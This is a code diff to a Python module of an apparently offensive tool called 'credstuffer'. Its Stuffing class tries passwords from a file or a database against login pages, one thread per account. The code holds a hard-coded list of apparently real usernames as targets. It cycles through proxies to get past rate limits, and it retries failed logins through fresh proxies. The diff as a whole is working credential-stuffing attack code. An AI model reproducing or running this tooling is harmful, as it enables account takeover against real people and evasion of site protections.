@@ -1,7 +1,6 @@
 import logging
 import threading
 from credstuffer import UserAccount
-from credstuffer.logins import Comunio, Instagram, Facebook
 from credstuffer.proxy import Proxy
 from credstuffer.dbhandler import DBHandler
 from credstuffer.exceptions import ProxyMaxRequestError, ProxyBadConnectionError
@@ -28,18 +27,17 @@ class Stuffing:
             stuffing = Stuffing()
 
     """
-    def __init__(self, account, filepath=None, **dbparams):
+    def __init__(self, accounts, filepath=None, **dbparams):
         self.logger = logging.getLogger('credstuffer')
         self.logger.info('create class Stuffing')
 
         # init base class
         #super().__init__(**dbparams)
-
+        usernames = ["Gandi", "Alki 90", "seitzfabi", "Cologne881", "Dömers123", "Mes35904", "alexvögerl", "seitzdani", "Michl85", "bierschi"]
         self.dbparams = dbparams
-        self.account = account
-
-        self.account.set_usernames(usernames=["Gandi", "Alki 90", "seitzfabi", "Cologne881", "Dömers123", "Mes35904", "alexvögerl", "seitzdani", "Michl85", "bierschi"])
-        #self.comunio.set_usernames(usernames=["Gandi", "Alki 90"])
+        self.accounts = accounts
+        for account in self.accounts:
+            account.set_usernames(usernames=usernames)
 
         self.proxy = Proxy(timeout_ms=50)
         self.http_str = 'http://'
@@ -48,38 +46,37 @@ class Stuffing:
         self.filepath = filepath
 
     def get_proxy_dict(self):
-        """
+        """ get proxy dictionary
 
-        :return:
+        :return: dict with 'http' proxy
         """
         proxy = self.proxy.get()
         http_proxy = self.http_str + proxy
-        #https_proxy = self.https_str + proxy
+
         return {'http': http_proxy}
 
-    def account_proxy(self, account):
+    def set_account_proxy(self, account):
         """ sets a proxy for the given account
 
         :param account: account instance
         """
-        try:
+
+        proxy_alive = False
+        while not proxy_alive:
             proxy = self.get_proxy_dict()
-            if account.set_proxy(proxy=proxy):
-                return
-            else:
-                return self.account_proxy(account=account)
-        except ProxyBadConnectionError as e:
-            return self.account_proxy(account)
+            if account.is_proxy_alive(proxy=proxy):
+                account.set_proxy(proxy=proxy)
+                proxy_alive = True
 
     def account_login(self, account, password):
         """ executes the account login with given password
 
         """
         try:
-            return account.login(password)
-        except (ProxyMaxRequestError, ProxyBadConnectionError, ProxyBadConnectionError) as e:
-            self.account_proxy(account=account)
-            return self.account_login(account=account, password=password)
+            account.login(password)
+        except (ProxyMaxRequestError, ProxyBadConnectionError) as e:
+            self.set_account_proxy(account=account)
+            self.account_login(account=account, password=password)
 
     def run(self):
         """
@@ -88,14 +85,15 @@ class Stuffing:
         """
         threads = []
         # handle user accounts
-        if isinstance(self.account, UserAccount):
-            thread = threading.Thread(target=self.user_account_worker, args=(self.account,))
-            threads.append(thread)
-            thread.start()
+        for account in self.accounts:
+            if isinstance(account, UserAccount):
+                thread = threading.Thread(target=self.user_account_worker, args=(account,))
+                threads.append(thread)
+                thread.start()
 
-        # handle email accounts
-        else:
-            pass
+            # handle email accounts
+            else:
+                pass
 
         for thread in threads:
             thread.join()
@@ -108,8 +106,8 @@ class Stuffing:
         :return:
         """
 
-        # set proxy
-        self.account_proxy(account=account)
+        # set proxy to account
+        self.set_account_proxy(account=account)
 
         if self.filepath is not None:
             # get passwords from file
@@ -120,9 +118,10 @@ class Stuffing:
                     self.account_login(account=account, password=password)
 
         else:
-            # init database
+            # init database connection
             dbhandler = DBHandler(**self.dbparams)
-            schema_list = dbhandler.schema_list
+            dbhandler.set_iteration_scheme(schemas='a', tables='abcdefghijklmnopqrstuvwxyz')
+            schema_list, table_list = dbhandler.get_iteration_scheme()
 
             # iterate over schemas
             for c_schema in schema_list:
